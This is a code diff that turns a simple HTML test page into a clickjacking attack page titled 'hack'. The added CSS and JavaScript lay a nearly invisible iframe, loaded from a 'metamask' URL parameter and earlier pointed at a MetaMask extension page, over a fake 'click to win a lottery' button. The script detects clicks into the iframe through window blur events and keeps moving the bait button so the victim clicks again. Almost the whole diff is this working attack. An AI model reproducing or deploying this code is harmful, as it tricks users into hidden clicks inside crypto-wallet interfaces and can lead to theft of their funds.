@@ -2,21 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>es6 test</title>
+    <title>hack</title>
     <style type="text/css">
         body {
             font-size: 50px;
             text-align: center;
+            width: 960px;
+            position: relative;
+            margin: 0 auto;
         }
         iframe {
+            position:absolute;
+            left: 0;
+            top: 120px;
             width: 100%;
             height: 1000px;
+            opacity: 0.1;
+            z-index: 2;
+            border: 0;
+        }
+        #choujiang{
+            position: absolute;
+            left: 605px;
+            top: 903px;
+            z-index: 1;
+            width: 180px;
         }
     </style>
 </head>
 <body>
 下面是个iframe
-<iframe id="if" src="chrome-extension://mcohilncbfahbmgdjkbpemcciiolgcge/phishing.html#hostname=lzg0321.github.io"></iframe>
+<iframe id="if" src=""></iframe>
+<button id="choujiang">点我抽奖</button>
 
 <script>
     const getUrlParams = (url) => {
@@ -29,11 +46,78 @@
         });
         return obj;
     };
+    let step = 0
+    let btn = document.getElementById('choujiang')
+
+    const posMap = {
+        0: {
+            text: '第一次没抽中，再点一次！',
+            x: 174, y: 313,
+        },
+        1: {
+            text: 'xxx',
+            x: 260, y: 313,
+        }
+    }
+    function clickIframe() {
+        triggerOut()
+        let pos = posMap[step]
+        if (pos) {
+            if (typeof pos.x === "number") {
+                btn.style.left = pos.x + 'px'
+            }
+            if (typeof pos.y === "number") {
+                btn.style.top = pos.y + 'px'
+            }
+            if(pos.text) {
+                btn.innerText = pos.text
+            }
+        }
+        switch (step) {
+            case 0:
+            {
+            }
+            break
+            case 1:
+            {
+            }
+                break
+        }
+        step++
+    }
+    let isOverIFrame = false
     let iframe = document.getElementById('if')
+    function triggerOut() {
+        setTimeout(function (){
+            iframe.style.left = '-10000px'
+            setTimeout(function(){
+                iframe.style.left = '0px'
+            }, 300)
+        }, 500)
+
+    }
+    iframe.addEventListener( 'mouseenter', function (e) {
+        console.log('enter iframe')
+        window.focus();
+        isOverIFrame = true;
+    });
+    iframe.addEventListener('mouseout', function () {
+        console.log('out iframe')
+        isOverIFrame = false;
+    });
+    window.addEventListener('blur', function () {
+        if (!isOverIFrame) return
+        console.log('clicked')
+        clickIframe()
+    }, true);
+
     let params = getUrlParams(location.href)
     if (params.metamask) {
         iframe.src = decodeURIComponent(params.metamask)
     }
+    iframe.addEventListener('click', function (){
+        console.log('clicked')
+    })
 </script>
 </body>
 </html>
